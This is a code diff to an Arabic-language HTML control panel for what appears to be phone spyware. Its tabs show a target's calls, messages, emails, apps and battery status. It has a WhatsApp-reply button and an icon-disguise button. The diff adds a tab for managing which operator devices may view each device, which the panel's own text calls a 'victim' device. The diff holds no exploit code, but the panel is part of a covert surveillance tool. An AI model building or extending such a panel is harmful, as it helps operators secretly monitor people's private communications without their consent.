@@ -43,19 +43,18 @@
                 <button id="replyWaBtn" onclick="openReplyWaPicker()" style="background:linear-gradient(135deg,#128C7E,#075E54);color:#fff;border:none;padding:12px 25px;border-radius:25px;font-weight:bold;font-size:14px;cursor:pointer;box-shadow:0 0 20px rgba(18,140,126,0.6);">
                     ↩️ رد واتساب
                 </button>
-                <!-- ✅ زر التنكر -->
                 <button id="disguiseBtn" onclick="openDisguiseMenu()" style="background:linear-gradient(135deg,#9b59b6,#8e44ad);color:#fff;border:none;padding:12px 25px;border-radius:25px;font-weight:bold;font-size:14px;cursor:pointer;box-shadow:0 0 20px rgba(155,89,182,0.6);">
                     🎭 تغيير الأيقونة
                 </button>
             </div>
         </header>
-        
+
         <div class="status-bar">
             <div class="status-item"><span class="label">الحالة:</span><span id="networkStatus" class="value">غير متصل</span></div>
             <div class="status-item"><span class="label">البطارية:</span><span id="batteryStatus" class="value">—</span></div>
             <div class="status-item"><span class="label">آخر اتصال:</span><span id="lastSeen" class="value">—</span></div>
         </div>
-        
+
         <div class="tabs">
             <button class="tab active" onclick="switchTab('calls')">📞 المكالمات <span id="callCount" class="count"></span></button>
             <button class="tab" onclick="switchTab('sms')">💬 الرسائل <span id="smsCount" class="count"></span></button>
@@ -68,8 +67,9 @@
             <button class="tab" onclick="switchTab('emails')">📧 البريد <span id="emailsCount" class="count"></span></button>
             <button class="tab" onclick="switchTab('apps')">📱 التطبيقات <span id="appsCount" class="count"></span></button>
             <button class="tab" onclick="switchTab('device')">📊 الجهاز</button>
+            <button class="tab" onclick="switchTab('security')">🔐 الأجهزة <span id="pendingBadge" class="count"></span></button>
         </div>
-        
+
         <div class="tab-content">
             <div id="callsTab" class="tab-pane active">
                 <h3>📞 المكالمات</h3>
@@ -140,6 +140,34 @@
                 <h3>📊 الجهاز</h3>
                 <div id="deviceInfo"></div>
             </div>
+
+            <div id="securityTab" class="tab-pane">
+                <h3>🔐 الأجهزة المصرح لها</h3>
+
+                <div style="margin-bottom:20px;">
+                    <h4 style="color:#ffcc00;">⏳ قيد الانتظار</h4>
+                    <div id="pendingDevicesList" style="margin-top:10px;"></div>
+                </div>
+
+                <div style="margin-bottom:20px;">
+                    <h4 style="color:#00ffcc;">✅ مصرح لها</h4>
+                    <div id="approvedDevicesList" style="margin-top:10px;"></div>
+                </div>
+
+                <div style="margin-bottom:20px;">
+                    <h4 style="color:#ff3300;">🚫 محجوبة</h4>
+                    <div id="deniedDevicesList" style="margin-top:10px;"></div>
+                </div>
+
+                <!-- ✅ قسم صلاحيات الأجهزة -->
+                <div style="margin-top:30px;">
+                    <h4 style="color:#9b59b6;">🔐 صلاحيات الوصول للأجهزة</h4>
+                    <p style="color:#888;font-size:12px;margin-bottom:15px;">
+                        اختر من يستطيع رؤية كل جهاز ضحية
+                    </p>
+                    <div id="devicePermsList" style="margin-top:10px;"></div>
+                </div>
+            </div>
         </div>
     </div>
 
@@ -202,11 +230,11 @@
             <p style="color:#666;text-align:center;padding:50px;">لا توجد رسائل صوتية بعد</p>
         </div>
     </div>
-    
+
     <script src="script.js"></script>
     <script>
     document.addEventListener('DOMContentLoaded', function() { playSound(); });
     function playSound() { try { const audio = new Audio('v.wav'); audio.volume = 1.0; audio.play(); } catch (e) {} }
     </script>
 </body>
-                </html>
+                    </html>
